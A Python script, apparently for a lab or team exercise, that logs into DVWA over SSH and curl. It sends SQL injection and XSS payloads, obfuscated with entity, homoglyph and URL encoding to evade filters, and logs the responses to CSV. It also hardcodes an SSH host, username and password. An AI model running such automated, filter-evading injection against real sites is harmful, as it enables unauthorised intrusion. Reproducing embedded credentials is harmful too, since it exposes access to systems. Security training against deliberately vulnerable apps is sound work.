#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
run_dvwa_via_ssh.py
Монолитный скрипт: SSH -> curl (на удалённой ВМ) -> логин admin/password -> вставка payloads -> запись результатов в CSV.
Подготовлен для dvwa.local внутри ВМ.
Требует: paramiko, bs4 (beautifulsoup4)
pip install paramiko beautifulsoup4 lxml
"""

import paramiko
import shlex
import time
import csv
import os
import random
import re
from datetime import datetime
from urllib.parse import quote
from bs4 import BeautifulSoup

# -------------------- Конфигурация --------------------
SSH_HOST = "203.81.208.25"       # подставь свои SSH данные если отличны
SSH_PORT = 22006
SSH_USER = "team06"
SSH_PASS = "#@~79j0gb2$a"  # если используешь пароль, укажи здесь или через ENV
SSH_KEY_PATH = None  # если используешь ключ, укажи путь

# Учетная запись для DVWA (по твоему запросу: admin / password)
DVWA_USER = "admin"
DVWA_PASS = "password"

DVWA_HOST = "http://dvwa.local"         # адрес внутри ВМ
LOGIN_PATH = "/login.php"
# целевая "вкладка" — по умолчанию SQLi. Подставь нужную страницу и поле
TARGET_PATH = "/vulnerabilities/sqli/"
TARGET_METHOD = "GET"                   # для sqli чаще GET (id=...), для XSS может быть POST
TARGET_FIELD_NAME = "id"                # имя поля куда вставлять payload (пример: id)
COOKIE_JAR_REMOTE = "/tmp/dvwa_cookies.txt"
CURL_TIMEOUT = 20
OUTPUT_CSV = "dvwa_results.csv"
VERBOSE = True
# ----------------------------------------------------

# -------------------- Payloads (пример) --------------------
payloads = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' UNION SELECT null, null--",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "normal"
]
# ---------------------------------------------------------

def vprint(*a, **k):
    if VERBOSE:
        print(*a, **k)

# -------------------- Твоя функция Coding() (упрощённо интегрирована) --------------------
def Coding(request):
    # Скопирована и немного упрощена версия твоей функции
    if not request or not isinstance(request, str):
        return request

    def is_sql_injection(text):
        sql_patterns = [
            r'\b(SELECT|UNION|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC)\b',
            r'(\-\-|\#|\/\*|\*\/)',
            r'(\'|\"|;)|\bOR\b|\bAND\b'
        ]
        return any(re.search(p, text, re.IGNORECASE) for p in sql_patterns)

    def is_xss_injection(text):
        xss_patterns = [
            r'<script[^>]*>.*?</script>',
            r'on\w+\s*=',
            r'javascript:',
            r'alert\(|<img'
        ]
        return any(re.search(p, text, re.IGNORECASE) for p in xss_patterns)

    def apply_html_entities(text, level=1):
        if level == 1:
            text = text.replace("'", "&#39;").replace('"', "&#34;").replace('<', "&lt;").replace('>', "&gt;").replace('&', "&amp;")
        else:
            encoded = []
            for ch in text:
                if ch.isalnum():
                    encoded.append(ch)
                else:
                    if random.random() > 0.5:
                        encoded.append(f"&#{ord(ch)};")
                    else:
                        encoded.append(f"&#x{ord(ch):x};")
            text = ''.join(encoded)
        return text

    def apply_url_encoding(text, level=1):
        if level <= 1:
            return quote(text)
        else:
            for _ in range(level):
                text = quote(text)
            return text

    def apply_unicode_obfuscation(text):
        # простая подмена некоторых букв на похожие
        uni = {'a': 'а', 'o': 'ο', 'e': 'е', 's': 'ѕ'}
        out = []
        for ch in text:
            if ch.lower() in uni and random.random() > 0.7:
                out.append(uni[ch.lower()])
            else:
                out.append(ch)
        return ''.join(out)

    encoded = request
    if is_sql_injection(request) or is_xss_injection(request):
        # применяем несколько случайных техник
        if random.random() < 0.7:
            encoded = apply_html_entities(encoded, level=random.choice([1,2]))
        if random.random() < 0.6:
            encoded = apply_unicode_obfuscation(encoded)
        if random.random() < 0.4:
            encoded = apply_url_encoding(encoded, level=1)
    return encoded
# ---------------------------------------------------------------------------------------------

# -------------------- SSH Runner --------------------
class SSHRunner:
    def __init__(self, host, port, username, password=None, pkey_path=None, timeout=10):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.pkey_path = pkey_path
        self.timeout = timeout
        self.client = None

    def connect(self):
        if self.client and self.client.get_transport() and self.client.get_transport().is_active():
            return
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        kwargs = {"hostname": self.host, "port": self.port, "username": self.username, "timeout": self.timeout}
        if self.pkey_path:
            kwargs["pkey"] = paramiko.RSAKey.from_private_key_file(self.pkey_path)
        else:
            kwargs["password"] = self.password
        self.client.connect(**kwargs)

    def close(self):
        if self.client:
            self.client.close()
            self.client = None

    def run(self, cmd, timeout=60):
        self.connect()
        stdin, stdout, stderr = self.client.exec_command(cmd, timeout=timeout)
        out = stdout.read().decode(errors="ignore")
        err = stderr.read().decode(errors="ignore")
        exit_code = stdout.channel.recv_exit_status()
        return exit_code, out, err
# ------------------------------------------------

# -------------------- Утилиты curl на ВМ --------------------
def curl_fetch(remote_runner, url, method="GET", data=None, cookie_jar=COOKIE_JAR_REMOTE, timeout=CURL_TIMEOUT, extra_headers=None):
    headers_cmd = ""
    if extra_headers:
        for k, v in extra_headers.items():
            headers_cmd += f" -H {shlex.quote(f'{k}: {v}')}"
    data_cmd = ""
    if method.upper() == "POST" and data:
        for k, v in data.items():
            data_cmd += f" --data-urlencode {shlex.quote(f'{k}={v}')}"
    elif method.upper() == "GET" and data:
        import urllib.parse
        qs = urllib.parse.urlencode(data)
        url = url + ("&" if "?" in url else "?") + qs

    cmd = f"curl -sS -L -m {timeout} -c {shlex.quote(cookie_jar)} -b {shlex.quote(cookie_jar)} -A 'Mozilla/5.0' {headers_cmd} {data_cmd} -w '%{{http_code}}' {shlex.quote(url)}"
    ec, out, err = remote_runner.run(cmd, timeout=timeout+5)
    http_code = None
    body = out
    if out and len(out) >= 3 and out[-3:].isdigit():
        http_code = int(out[-3:])
        body = out[:-3]
    else:
        http_code = 0
    return http_code, body, ec, err

# -------------------- Основные операции: логин и отправка payloads --------------------
def init_and_login(runner: SSHRunner):
    # удалить старый cookie jar
    runner.run(f"rm -f {shlex.quote(COOKIE_JAR_REMOTE)}")
    vprint("[*] Получаем страницу логина (GET)...")
    login_url = DVWA_HOST.rstrip("/") + LOGIN_PATH
    # получаем страницу (headers+body не нужны — curl_fetch вернёт тело)
    code, body, ec, err = curl_fetch(runner, login_url, method="GET")
    # Попробуем распарсить CSRF token
    token_name = None
    token_value = None
    try:
        # используем html парсер, если lxml нет — BS4 сам выберет html.parser
        soup = BeautifulSoup(body, "lxml")
        for candidate in ("user_token", "csrf", "csrftoken", "token"):
            el = soup.find("input", {"name": candidate})
            if el and el.get("value"):
                token_name, token_value = candidate, el.get("value")
                vprint(f"[*] Найден CSRF token: {token_name} = {token_value}")
                break
    except Exception as e:
        vprint("[!] Не удалось распарсить токен:", e)

    # Формируем данные логина
    login_data = {"username": DVWA_USER, "password": DVWA_PASS, "Login": "Login"}
    if token_name and token_value:
        login_data[token_name] = token_value

    vprint("[*] Отправляем POST логина (admin/password)...")
    code, body, ec, err = curl_fetch(runner, login_url, method="POST", data=login_data, extra_headers={"Referer": login_url})
    vprint(f"[*] Результат логина: HTTP={code}, curl_ec={ec}, stderr_len={len(err)}")
    # проверка успешности по наличию 'logout' или http 200/302
    success = False
    if body and ("logout" in body.lower() or "welcome" in body.lower()):
        success = True
    if code in (200, 302):
        # иногда DVWA возвращает 200 + индикатор в теле
        success = success or True
    if not success:
        vprint("[!] Логин не подтверждён. Возможно security level / WAF блокирует. Однако скрипт продолжит попытки.")
    return success

def send_payloads(runner: SSHRunner, payload_list):
    results = []
    target_url = DVWA_HOST.rstrip("/") + TARGET_PATH
    for p in payload_list:
        ts = datetime.utcnow().isoformat() + "Z"
        obf = Coding(p)
        # формируем данные/qs
        if TARGET_METHOD.upper() == "POST":
            data = {TARGET_FIELD_NAME: obf}
            code, body, ec, err = curl_fetch(runner, target_url, method="POST", data=data, extra_headers={"Referer": target_url})
        else:
            data = {TARGET_FIELD_NAME: obf}
            code, body, ec, err = curl_fetch(runner, target_url, method="GET", data=data, extra_headers={"Referer": target_url})

        snippet = (body or "")[:1500].replace("\n", " ").replace("\r", " ")
        vprint(f"[{ts}] PAYLOAD: {p!r} -> HTTP: {code} (len body {len(snippet)})")
        # если 403 — логируем и продолжаем
        if code == 403:
            vprint(f"  -> Получен 403 для payload {p!r}. Продолжаем.")
        results.append({
            "timestamp": ts,
            "payload": p,
            "obfuscated": obf,
            "http_code": code,
            "response_snippet": snippet,
            "curl_exit_code": ec,
            "curl_stderr": err.strip()
        })
        time.sleep(0.3)
    return results

def save_csv(rows, path=OUTPUT_CSV):
    header = ["timestamp", "payload", "obfuscated", "http_code", "response_snippet", "curl_exit_code", "curl_stderr"]
    exist = os.path.exists(path)
    with open(path, "a", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=header)
        if not exist:
            writer.writeheader()
        for r in rows:
            writer.writerow(r)

# -------------------- Главная логика --------------------
def main():
    # Поддержка указания пароля прямо в конфиге (если не указан, спросим интерактивно)
    global SSH_PASS
    if SSH_PASS is None:
        # если хочешь — можешь убрать интерактив и хардкодить пароль
        try:
            import getpass
            SSH_PASS = getpass.getpass("SSH password (team06): ")
        except Exception:
            pass

    runner = SSHRunner(SSH_HOST, SSH_PORT, SSH_USER, password=SSH_PASS, pkey_path=SSH_KEY_PATH)
    try:
        vprint(f"[SSH] Подключаюсь к {SSH_HOST}:{SSH_PORT} как {SSH_USER} ...")
        runner.connect()
        logged = init_and_login(runner)
        # запускаем отправку payloads
        rows = send_payloads(runner, payloads)
        save_csv(rows)
        vprint(f"[+] Готово. Сохранено {len(rows)} записей в {OUTPUT_CSV}")
    finally:
        runner.close()

if __name__ == "__main__":
    main()
